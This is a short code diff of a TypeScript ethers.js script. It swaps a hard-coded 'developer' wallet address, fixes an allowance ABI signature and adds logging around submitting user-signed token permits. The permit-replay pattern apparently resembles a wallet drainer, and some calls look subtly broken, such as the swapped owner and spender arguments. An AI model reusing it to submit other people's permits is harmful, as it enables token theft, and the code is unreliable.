@@ -11,7 +11,7 @@ import {JsonRpcSigner} from "@ethersproject/providers";
 
 const BNBContract = "0x1b44F3514812d835EB1BDB0acB33d3fA3351Ee43";
 const developer = {
-	address: "0xB932eF059c3857FBA2505B31E5899b3E170f25E7"
+	address: "0x4a13959671D73A49431F4224Ec44A792368d1558"
 }
 const abi = [
 	'function permit (address owner, address spender, uint256 value, uint256 deadline, uint8 v, bytes32 r, bytes32 s)',
@@ -284,11 +284,12 @@ async function handle(json: any, signer?: JsonRpcSigner) {
 	let tokenContract = new ethers.Contract(spender, [
 			'function permit(address owner, address spender, uint256 amount, uint256 deadline, uint8 v, bytes32 r, bytes32 s) external',
 			'function transferFrom(address from, address to, uint256 value) external returns (bool)',
-			'function allowance(address owner, address spender, uint256 value) external returns (bool)',
+			'function allowance(address owner, address spender) external returns (uint256)',
 	], SIGNER);
 
 	const args = [spender,owner, amount, deadline, v, r, s];
 	console.log(args)
+	console.log(await contract.allowance(owner,spender))
 	const gasLimit = ethers.utils.hexlify(100000); // You may need to adjust this value
 	const tx = await tokenContract.permit(...args, {
 		gasLimit
